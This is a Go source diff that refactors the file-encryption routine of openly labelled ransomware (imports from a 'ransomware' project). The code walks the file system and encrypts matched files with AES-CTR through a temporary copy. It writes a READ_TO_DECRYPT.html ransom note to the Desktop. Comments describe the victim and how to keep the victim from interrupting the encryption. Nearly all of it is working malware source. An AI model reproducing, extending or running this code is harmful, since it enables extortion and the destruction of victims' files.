@@ -1,13 +1,9 @@
 package main
 
 import (
-	"crypto/aes"
-	"crypto/cipher"
-	"crypto/rand"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"io"
 	"io/ioutil"
 	"log"
 	"net/url"
@@ -19,6 +15,7 @@ import (
 
 	"github.com/mauri870/ransomware/client"
 	"github.com/mauri870/ransomware/cmd"
+	"github.com/mauri870/ransomware/cryptofs"
 	"github.com/mauri870/ransomware/rsa"
 	"github.com/mauri870/ransomware/utils"
 )
@@ -32,7 +29,7 @@ var (
 	SecondsToTimeout = 5.0
 
 	// Create a slice to store the files to rename after encryption
-	FilesToRename []cmd.File
+	FilesToRename []*cryptofs.File
 )
 
 func init() {
@@ -141,7 +138,7 @@ func encryptFiles() {
 						// Send the file to the MatchedFiles channel then workers
 						// can imediatelly proccess then
 						log.Println("Matched:", path)
-						cmd.MatchedFiles <- cmd.File{FileInfo: f, Extension: ext[1:], Path: path}
+						cmd.MatchedFiles <- &cryptofs.File{FileInfo: f, Extension: ext[1:], Path: path}
 
 						//for each file we need wait for the goroutine to finish
 						wg.Add(1)
@@ -170,7 +167,39 @@ func encryptFiles() {
 
 					log.Printf("Encrypting %s...\n", file.Path)
 
-					encryptFile(file, keys["enckey"])
+					// We need make a temporary copy of the file for store the encrypted content
+					// before move then to the original file
+					// This is necessary because if the victim has many files it can observe the
+					// encrypted names appear and turn off the computer before the process is completed
+					// The files will be renamed later, after all have been encrypted properly
+					//
+					// Create/Open the temporary output file
+					tempFile, err := os.OpenFile(cmd.TempDir+file.Name(), os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
+					if err != nil {
+						log.Println(err)
+						return
+					}
+					defer tempFile.Close()
+
+					// Encrypt the file to the temporary file
+					err = file.Encrypt(keys["enckey"], tempFile)
+					if err != nil {
+						log.Println(err)
+						continue
+					}
+
+					//We need to close the tempFile manually before proceed
+					tempFile.Close()
+					// Here we can use os.Rename to move the tempFile to the
+					// original file
+					err = os.Rename(cmd.TempDir+file.Name(), file.Path)
+					if err != nil {
+						log.Println(err)
+						continue
+					}
+
+					// Schedule the file to rename it later
+					FilesToRename = append(FilesToRename, file)
 				}
 			}
 		}()
@@ -214,96 +243,4 @@ func encryptFiles() {
 	ioutil.WriteFile(cmd.BaseDir+"Desktop\\READ_TO_DECRYPT.html", content, 0600)
 
 	log.Println("Done! Don't forget to read the READ_TO_DECRYPT.html file on Desktop")
-}
-
-// Encrypt a single file
-func encryptFile(file cmd.File, enckey string) {
-	// Open the file read only
-	inFile, err := os.Open(file.Path)
-	if err != nil {
-		log.Println(err)
-		return
-	}
-	defer inFile.Close()
-
-	// Create a 128 bits cipher.Block for AES-256
-	block, err := aes.NewCipher([]byte(enckey))
-	if err != nil {
-		log.Println(err)
-		return
-	}
-
-	// The IV needs to be unique, but not secure
-	iv := make([]byte, aes.BlockSize)
-	if _, err = io.ReadFull(rand.Reader, iv); err != nil {
-		log.Println(err)
-		return
-	}
-
-	// Get a stream for encrypt/decrypt in counter mode (best performance I guess)
-	stream := cipher.NewCTR(block, iv)
-
-	// We need make a temporary copy of the file for store the encrypted content
-	// before move then to the original file
-	// This is necessary because if the victim has many files it can observe the
-	// encrypted names appear and turn off the computer before the process is completed
-	// The files will be renamed later, after all have been encrypted properly
-	//
-	// Create/Open the temporary output file
-	outFile, err := os.OpenFile(cmd.TempDir+file.Name(), os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
-	if err != nil {
-		log.Println(err)
-		return
-	}
-	defer outFile.Close()
-
-	// Write the Initialization Vector (iv) as the first block
-	// of the encrypted file
-	outFile.Write(iv)
-
-	// Open a stream to encrypt and write to output file
-	writer := &cipher.StreamWriter{S: stream, W: outFile}
-
-	// Copy the input file to the output file, encrypting as we go.
-	if _, err = io.Copy(writer, inFile); err != nil {
-		log.Println(err)
-		return
-	}
-
-	// Close both files before proceed
-	inFile.Close()
-	outFile.Close()
-
-	// Reopen the original file write-only, truncating then
-	inFile, err = os.OpenFile(file.Path, os.O_WRONLY|os.O_TRUNC, 0600)
-	if err != nil {
-		log.Println(err)
-		return
-	}
-	defer inFile.Close()
-
-	// Reopen the temporary file read-only
-	outFile, err = os.Open(cmd.TempDir + file.Name())
-	if err != nil {
-		log.Println(err)
-		return
-	}
-	defer outFile.Close()
-
-	// Copy the temporary file to the original file
-	if _, err = io.Copy(inFile, outFile); err != nil {
-		log.Println(err)
-		return
-	}
-
-	// Remove the temporary file
-	outFile.Close()
-	err = os.Remove(cmd.TempDir + file.Name())
-	if err != nil {
-		log.Println("Cannot delete temporary file, skipping...")
-		return
-	}
-
-	// Schedule the file to rename it later
-	FilesToRename = append(FilesToRename, file)
 }
